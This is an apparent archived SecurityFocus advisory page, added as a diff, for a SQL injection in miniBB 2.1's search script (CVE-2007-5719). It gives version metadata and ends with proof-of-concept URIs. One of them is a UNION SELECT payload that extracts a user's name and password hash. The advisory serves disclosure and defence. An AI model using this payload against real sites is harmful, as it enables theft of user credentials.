@@ -1,0 +1,219 @@
+#SpeeDr00t@Black Falcon<br>#bid26249<p><b><span style="font-size: 18pt;">miniBB BB_FUNC_SEARCH.PHP SQL Injection Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/26249/info">info</a><br><a href="http://www.securityfocus.com/bid/26249/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/26249/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/26249/solution">solution</a><br><a href="http://www.securityfocus.com/bid/26249/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				26249
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2007-5719<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Oct 30 2007 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 07 2015 05:34PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				irk4z discovered this vulnerability.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					MiniBB MiniBB  2.1<br/>
+<span class="related">
+						
+							-
+						
+						Apache Apache 1.3.24 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apache Apache 1.3.24 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apache Apache 1.3.23 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apache Apache 1.3.23 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apache Apache 1.3.22 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apache Apache 1.3.22 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apache Apache 1.3.20 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apache Apache 1.3.20 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apache Apache 1.3.19 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apache Apache 1.3.19 <br/>
+</span>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					MiniBB MiniBB  2.1a<br/>
+<span class="related">
+						
+							-
+						
+						Apache Apache 1.3.24 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apache Apache 1.3.24 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apache Apache 1.3.23 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apache Apache 1.3.23 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apache Apache 1.3.22 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apache Apache 1.3.22 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apache Apache 1.3.20 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apache Apache 1.3.20 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apache Apache 1.3.19 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apache Apache 1.3.19 <br/>
+</span>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can use a browser to exploit this issue.<br/><br/>The following proof-of-concept URIs are available:<br/><br/>http://www.example.com/index.php?action=search&amp;amp;where=3&amp;amp;searchGo=1&amp;amp;table=SQL<br/>http://www.example.com/index.php?action=search&amp;amp;where=3&amp;amp;searchGo=1&amp;amp;table=minibbtable_posts/**/LIMIT/**/0/**/UNION/**/SELECT/**/hex(concat(username,0x20,user_password))/**/FROM/**/minibbtable_users/**/WHERE/**/user_id=1/*
+	
+		<ul>
+</ul>
+</div>
